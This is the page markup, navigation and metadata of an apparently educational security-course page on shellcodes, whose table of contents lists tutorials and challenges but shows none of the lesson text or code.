<!doctype html><html itemscope itemtype=http://schema.org/WebPage lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=generator content="Hugo 0.101.0"><meta name=robots content="index, follow"><link rel="shortcut icon" href=/favicons/favicon.ico><link rel=apple-touch-icon href=/favicons/apple-touch-icon-180x180.png sizes=180x180><link rel=icon type=image/png href=/favicons/favicon-16x16.png sizes=16x16><link rel=icon type=image/png href=/favicons/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/favicons/android-36x36.png sizes=36x36><link rel=icon type=image/png href=/favicons/android-48x48.png sizes=48x48><link rel=icon type=image/png href=/favicons/android-72x72.png sizes=72x72><link rel=icon type=image/png href=/favicons/android-96x96.png sizes=96x96><link rel=icon type=image/png href=/favicons/android-144x144.png sizes=144x144><link rel=icon type=image/png href=/favicons/android-192x192.png sizes=192x192><title>Security Summer School</title><meta name=description content="Table of contents Introduction Stack-buffer-overflow recap Code injection Develop Inject Trigger &amp;ldquo;Shellcodes&amp;rdquo; Tutorials 01. Tutorial: generating machine code 02. Tutorial: inspecting machine code 03. Tutorial: feeding machine code to a program 04. Tutorial: &amp;ldquo;Hello, world!&amp;rdquo; shellcode 05. Tutorial: Debugging shellcodes Challenges 06. Challenge: /bin/sh shellcode 07. Challenge: shellcode on stack 08. Challenge: shellcode after saved ret 09. Challenge: shellcode after saved ret - no leak 10. Challenge: shellcode as command line arg 11."><meta property="og:title" content><meta property="og:description" content="Table of contents Introduction Stack-buffer-overflow recap Code injection Develop Inject Trigger &ldquo;Shellcodes&rdquo; Tutorials 01. Tutorial: generating machine code 02. Tutorial: inspecting machine code 03. Tutorial: feeding machine code to a program 04. Tutorial: &ldquo;Hello, world!&rdquo; shellcode 05. Tutorial: Debugging shellcodes Challenges 06. Challenge: /bin/sh shellcode 07. Challenge: shellcode on stack 08. Challenge: shellcode after saved ret 09. Challenge: shellcode after saved ret - no leak 10. Challenge: shellcode as command line arg 11."><meta property="og:type" content="article"><meta property="og:url" content="/binary/shellcodes/"><meta property="article:section" content="binary"><meta property="og:site_name" content="Security Summer School"><meta itemprop=name content><meta itemprop=description content="Table of contents Introduction Stack-buffer-overflow recap Code injection Develop Inject Trigger &ldquo;Shellcodes&rdquo; Tutorials 01. Tutorial: generating machine code 02. Tutorial: inspecting machine code 03. Tutorial: feeding machine code to a program 04. Tutorial: &ldquo;Hello, world!&rdquo; shellcode 05. Tutorial: Debugging shellcodes Challenges 06. Challenge: /bin/sh shellcode 07. Challenge: shellcode on stack 08. Challenge: shellcode after saved ret 09. Challenge: shellcode after saved ret - no leak 10. Challenge: shellcode as command line arg 11."><meta itemprop=wordCount content="2924"><meta itemprop=keywords content><meta name=twitter:card content="summary"><meta name=twitter:title content><meta name=twitter:description content="Table of contents Introduction Stack-buffer-overflow recap Code injection Develop Inject Trigger &ldquo;Shellcodes&rdquo; Tutorials 01. Tutorial: generating machine code 02. Tutorial: inspecting machine code 03. Tutorial: feeding machine code to a program 04. Tutorial: &ldquo;Hello, world!&rdquo; shellcode 05. Tutorial: Debugging shellcodes Challenges 06. Challenge: /bin/sh shellcode 07. Challenge: shellcode on stack 08. Challenge: shellcode after saved ret 09. Challenge: shellcode after saved ret - no leak 10. Challenge: shellcode as command line arg 11."><link rel=preload href=/scss/main.min.5aef8a3f4159801f5dbe642e33f5332212e837eda91d37dcd891fdcd5c32498a.css as=style><link href=/scss/main.min.5aef8a3f4159801f5dbe642e33f5332212e837eda91d37dcd891fdcd5c32498a.css rel=stylesheet integrity><script src=https://code.jquery.com/jquery-3.6.0.min.js integrity=sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK crossorigin=anonymous></script>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-00000000-0","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body class=td-page><header><nav class="js-navbar-scroll navbar navbar-expand navbar-dark flex-column flex-md-row td-navbar"><a class=navbar-brand href=/><span class=navbar-logo><svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 500 500" style="enable-background:new 0 0 500 500"><g><path style="fill:#fff" d="M116.8525 421.9722c-5.7041.0-10.3442-4.3127-10.3442-9.6129V88.183c0-5.3002 4.6401-9.6117 10.3442-9.6117H320.858c3.0347.0 9.3959.5498 11.7506 2.6302l.3545.3442 58.905 63.2912c2.3101 2.491 2.9202 8.4928 2.9202 11.3184v256.2039c0 5.3002-4.6407 9.6129-10.3436 9.6129H116.8525z"/><g><g><g><path style="fill:#767676" d="M384.4445 423.2066H116.852c-6.3839.0-11.5786-4.8658-11.5786-10.8474V88.1831c0-5.9804 5.1947-10.8461 11.5786-10.8461h204.0062c.377.0 9.2786.0329 12.568 2.9389l.3947.3833 58.9508 63.337c3.2135 3.4652 3.2514 11.7924 3.2514 12.1593v256.2036C396.0231 418.3408 390.8284 423.2066 384.4445 423.2066zM116.5079 411.9189c.0848.0278.1999.0531.3441.0531h267.5925c.1442.0.2581-.0253.3441-.0531V156.1556c-.0076-.9033-.3593-3.7347-.7034-5.0037l-57.6527-61.9416c-1.4651-.3176-4.4533-.6389-5.5742-.6389H116.852c-.143.0-.2594.024-.3441.0531V411.9189zm267.4533-261.149zM327.0321 89.371v.0013V89.371z"/></g></g></g><g><g><path style="fill:#5b7fc0" d="M189.0874 210.1754l.0012-.0012c7.7751.0012 15.0295 4.1862 18.932 10.9234 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3304-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032s-11.328-2.2733-15.458-6.4032-6.4032-9.6186-6.4056-15.4628c.0012-6.025 2.454-11.4897 6.4116-15.4473C177.5953 212.627 183.0601 210.1742 189.0874 210.1754zm7.993 21.8576c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6539 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403S197.0816 234.1722 197.0804 232.033z"/><path style="opacity:.3;fill:#fff" d="M189.0898 210.176c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 212.6276 183.0612 210.176 189.0898 210.176zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 236.239 197.0839 234.2399 197.0839 232.0372z"/><g><defs><path id="SVGID_1_" d="M194.7376 237.6875c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.999 7.9942-7.9942 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.0839 234.2399 196.1861 236.239 194.7376 237.6875z"/></defs><clipPath id="SVGID_2_"><use xlink:href="#SVGID_1_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_2_);fill:#fff" d="M190.0704 225.0237c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 225.7247 191.9774 225.0237 190.0704 225.0237z"/><path style="opacity:.13;clip-path:url(#SVGID_2_);fill:#020202" d="M190.0704 225.0237c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 225.7247 191.9774 225.0237 190.0704 225.0237z"/></g><g><defs><path id="SVGID_3_" d="M189.0898 210.176c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 212.6276 183.0612 210.176 189.0898 210.176zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 236.239 197.0839 234.2399 197.0839 232.0372z"/></defs><clipPath id="SVGID_4_"><use xlink:href="#SVGID_3_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_4_);fill:#5b7fc0" d="M172.6595 215.6045c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8612 12.0547.0024 21.8636-9.797 21.8613-21.8612.0024-3.8475-1.0151-7.6326-2.9353-10.9462-3.8977-6.7324-11.1497-10.9151-18.926-10.9151C182.0806 209.1953 176.6171 211.647 172.6595 215.6045z"/></g></g><rect x="198.8952" y="225.1043" style="fill:#5b7fc0" width="122.6266" height="13.8671"/></g><g><path style="fill:#d95140" d="M189.0874 155.7611l.0012-.0012c7.7751.0012 15.0295 4.1862 18.932 10.9234 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3304-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032s-11.328-2.2733-15.458-6.4032-6.4032-9.6186-6.4056-15.4628c.0012-6.0249 2.454-11.4897 6.4116-15.4473C177.5953 158.2128 183.0601 155.7599 189.0874 155.7611zm7.993 21.8577c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6539 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403C196.2508 181.7667 197.0816 179.758 197.0804 177.6188z"/><path style="opacity:.3;fill:#fff" d="M189.0898 155.7617c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 158.2134 183.0612 155.7617 189.0898 155.7617zm7.9941 21.8613c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 181.8248 197.0839 179.8256 197.0839 177.623z"/><g><defs><path id="SVGID_5_" d="M194.7376 183.2733c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.9989 7.9942-7.9942 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.0839 179.8256 196.1861 181.8248 194.7376 183.2733z"/></defs><clipPath id="SVGID_6_"><use xlink:href="#SVGID_5_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_6_);fill:#fff" d="M190.0704 170.6095c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 171.3104 191.9774 170.6095 190.0704 170.6095z"/><path style="opacity:.13;clip-path:url(#SVGID_6_);fill:#020202" d="M190.0704 170.6095c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 171.3104 191.9774 170.6095 190.0704 170.6095z"/></g><g><defs><path id="SVGID_7_" d="M189.0898 155.7617c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 158.2134 183.0612 155.7617 189.0898 155.7617zm7.9941 21.8613c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 181.8248 197.0839 179.8256 197.0839 177.623z"/></defs><clipPath id="SVGID_8_"><use xlink:href="#SVGID_7_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_8_);fill:#d95140" d="M172.6595 161.1903c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8613 12.0547.0024 21.8636-9.797 21.8613-21.8613.0024-3.8474-1.0151-7.6326-2.9353-10.9462-3.8977-6.7324-11.1497-10.9151-18.926-10.9151C182.0806 154.7811 176.6171 157.2327 172.6595 161.1903z"/></g><rect x="198.8952" y="170.69" style="fill:#d95140" width="122.6266" height="13.8671"/></g><g><g><path style="fill:#56a55c" d="M189.5379 264.6147l.0012-.0012c7.7751.0012 15.0294 4.1862 18.932 10.9235 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3304-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032-5.8394.0-11.3281-2.2733-15.458-6.4032-4.13-4.13-6.4032-9.6186-6.4056-15.4628.0012-6.0249 2.454-11.4897 6.4116-15.4472C178.0458 267.0663 183.5105 264.6135 189.5379 264.6147zm7.993 21.8576c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6538 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403C196.7013 290.6202 197.5321 288.6115 197.5309 286.4723z"/><path style="opacity:.3;fill:#fff" d="M189.5403 264.6153c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8065-21.8612-21.8613.0-6.0285 2.4516-11.492 6.4116-15.452C178.0482 267.0669 183.5117 264.6153 189.5403 264.6153zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.6366 290.6783 197.5344 288.6792 197.5344 286.4765z"/><g><defs><path id="SVGID_9_" d="M195.1881 292.1268c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.9989 7.9942-7.9941 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.5344 288.6792 196.6366 290.6783 195.1881 292.1268z"/></defs><clipPath id="SVGID_10_"><use xlink:href="#SVGID_9_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_10_);fill:#fff" d="M190.5209 279.463c-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7446-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9941 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C194.239 280.164 192.4279 279.463 190.5209 279.463z"/><path style="opacity:.13;clip-path:url(#SVGID_10_);fill:#020202" d="M190.5209 279.463c-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7446-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9941 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C194.239 280.164 192.4279 279.463 190.5209 279.463z"/></g><g><defs><path id="SVGID_11_" d="M189.5403 264.6153c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8065-21.8612-21.8613.0-6.0285 2.4516-11.492 6.4116-15.452C178.0482 267.0669 183.5117 264.6153 189.5403 264.6153zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.6366 290.6783 197.5344 288.6792 197.5344 286.4765z"/></defs><clipPath id="SVGID_12_"><use xlink:href="#SVGID_11_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_12_);fill:#56a55c" d="M173.11 270.0439c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8613 12.0547.0024 21.8636-9.797 21.8613-21.8613.0024-3.8474-1.0151-7.6326-2.9353-10.9462-3.8977-6.7325-11.1497-10.9151-18.926-10.9151C182.5311 263.6346 177.0676 266.0863 173.11 270.0439z"/></g></g><rect x="199.3456" y="279.5436" style="fill:#56a55c" width="122.6266" height="13.8671"/></g><g><g><path style="fill:#f1bc42" d="M189.0874 318.7208l.0012-.0012c7.7751.0012 15.0295 4.1862 18.932 10.9234 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3305-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032s-11.328-2.2733-15.458-6.4032-6.4032-9.6186-6.4056-15.4628c.0012-6.025 2.454-11.4897 6.4116-15.4472C177.5953 321.1724 183.0601 318.7196 189.0874 318.7208zm7.993 21.8576c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6539 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403S197.0816 342.7176 197.0804 340.5784z"/><path style="opacity:.3;fill:#fff" d="M189.0898 318.7214c7.7763.0 15.0283 4.1826 18.926 10.915 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8612-12.0547.0024-21.8636-9.8065-21.8612-21.8612.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 321.173 183.0612 318.7214 189.0898 318.7214zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 344.7844 197.0839 342.7853 197.0839 340.5826z"/><g><defs><path id="SVGID_13_" d="M194.7376 346.2329c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.999 7.9942-7.9942 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.0839 342.7853 196.1861 344.7844 194.7376 346.2329z"/></defs><clipPath id="SVGID_14_"><use xlink:href="#SVGID_13_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_14_);fill:#fff" d="M190.0704 333.5691c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0834 6.1218 2.8788C193.7885 334.2701 191.9774 333.5691 190.0704 333.5691z"/><path style="opacity:.13;clip-path:url(#SVGID_14_);fill:#020202" d="M190.0704 333.5691c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0834 6.1218 2.8788C193.7885 334.2701 191.9774 333.5691 190.0704 333.5691z"/></g><g><defs><path id="SVGID_15_" d="M189.0898 318.7214c7.7763.0 15.0283 4.1826 18.926 10.915 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8612-12.0547.0024-21.8636-9.8065-21.8612-21.8612.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 321.173 183.0612 318.7214 189.0898 318.7214zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 344.7844 197.0839 342.7853 197.0839 340.5826z"/></defs><clipPath id="SVGID_16_"><use xlink:href="#SVGID_15_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_16_);fill:#f1bc42" d="M172.6595 324.15c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8612 12.0547.0024 21.8636-9.797 21.8613-21.8612.0024-3.8474-1.0151-7.6327-2.9353-10.9462-3.8977-6.7324-11.1497-10.9151-18.926-10.9151C182.0806 317.7407 176.6171 320.1924 172.6595 324.15z"/></g></g><rect x="198.8952" y="333.6497" style="fill:#f1bc42" width="122.6266" height="13.8671"/></g></g></svg></span><span class=font-weight-bold>Security Summer School</span></a><div class="td-navbar-nav-scroll ml-md-auto" id=main_navbar><ul class="navbar-nav mt-2 mt-lg-0"><li class="nav-item mr-4 mb-2 mb-lg-0"><a class="nav-link active" href=/binary/><span class=active>Binary Exploitation</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/essentials/><span>Security Essentials</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/web/><span>Web Security</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/community/><span>Community</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/docs/><span>Documentation</span></a></li></ul></div><div class="navbar-nav d-none d-lg-block"><input type=search class="form-control td-search-input" placeholder="&#xf002; Search this site…" aria-label="Search this site…" autocomplete=off></div></nav></header><div class="container-fluid td-outer"><div class=td-main><div class="row flex-xl-nowrap"><aside class="col-12 col-md-3 col-xl-2 td-sidebar d-print-none"><div id=td-sidebar-menu class=td-sidebar__inner><form class="td-sidebar__search d-flex align-items-center"><input type=search class="form-control td-search-input" placeholder="&#xf002; Search this site…" aria-label="Search this site…" autocomplete=off>
<button class="btn btn-link td-sidebar__toggle d-md-none p-0 ml-3 fas fa-bars" type=button data-toggle=collapse data-target=#td-section-nav aria-controls=td-section-nav aria-expanded=false aria-label="Toggle section navigation"></button></form><nav class="collapse td-sidebar-nav" id=td-section-nav><ul class="td-sidebar-nav__section pr-md-3 ul-0"><li class="td-sidebar-nav__section-title td-sidebar-nav__section with-child active-path" id=m-binary-li><a href=/binary/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__section tree-root" id=m-binary><span>Binary Exploitation</span></a><ul class=ul-1><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binarybuffer-exploitation-li><a href=/binary/buffer-exploitation/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binarybuffer-exploitation><span>Buffer Exploitation</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binarydefense-mechanisms-li><a href=/binary/defense-mechanisms/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binarydefense-mechanisms><span>Defense Mechanisms</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binarydynamic-analysis-li><a href=/binary/dynamic-analysis/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binarydynamic-analysis><span>Dynamic Analysis</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binaryexecutables-and-processes-li><a href=/binary/executables-and-processes/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binaryexecutables-and-processes><span>Executables and Processes</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binaryexploration-tools-li><a href=/binary/exploration-tools/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binaryexploration-tools><span>Exploration Tools</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binaryinformation-leaks-li><a href=/binary/information-leaks/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binaryinformation-leaks><span>Information Leaks</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binaryreturn-oriented-programming-li><a href=/binary/return-oriented-programming/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binaryreturn-oriented-programming><span>Return Oriented Programming</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binaryreturn-oriented-programming-advanced-li><a href=/binary/return-oriented-programming-advanced/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binaryreturn-oriented-programming-advanced><span>Return Oriented Programming Advanced</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child active-path" id=m-binaryshellcodes-li><a href=/binary/shellcodes/ title class="align-left pl-0 active td-sidebar-link td-sidebar-link__page" id=m-binaryshellcodes><span class=td-sidebar-nav-active-item>Shellcodes</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binaryshellcodes-advanced-li><a href=/binary/shellcodes-advanced/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binaryshellcodes-advanced><span>Shellcodes Advanced</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binarystatic-analysis-li><a href=/binary/static-analysis/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binarystatic-analysis><span>Static Analysis</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binarybypassing-mitigationsactivities03-tutorial-bypass-dep-no-aslr-libcreadme-li><a href=/binary/bypassing-mitigations/activities/03-tutorial-bypass-dep-no-aslr-libc/readme/ class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binarybypassing-mitigationsactivities03-tutorial-bypass-dep-no-aslr-libcreadme><span></span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binarybypassing-mitigationsactivities08-challenge-bypass-dep-no-aslr-libcreadme-li><a href=/binary/bypassing-mitigations/activities/08-challenge-bypass-dep-no-aslr-libc/readme/ class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binarybypassing-mitigationsactivities08-challenge-bypass-dep-no-aslr-libcreadme><span></span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binarybypassing-mitigationsactivities09-challenge-bypass-dep-aslr-libcreadme-li><a href=/binary/bypassing-mitigations/activities/09-challenge-bypass-dep-aslr-libc/readme/ class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binarybypassing-mitigationsactivities09-challenge-bypass-dep-aslr-libcreadme><span></span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binarycopying-li><a href=/binary/copying/ class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binarycopying><span></span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binaryextrapwntools-introreadme-li><a href=/binary/extra/pwntools-intro/readme/ class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binaryextrapwntools-introreadme><span></span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binaryreviewing-li><a href=/binary/reviewing/ class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binaryreviewing><span></span></a></li></ul></li></ul></nav></div></aside><aside class="d-none d-xl-block col-xl-2 td-sidebar-toc d-print-none"><div class="td-page-meta ml-2 pb-1 pt-2 mb-0"><a href=https://github.com/security-summer-school/security-summer-school.github.io/tree/main/content/en/binary/shellcodes/index.md class=td-page-meta--view 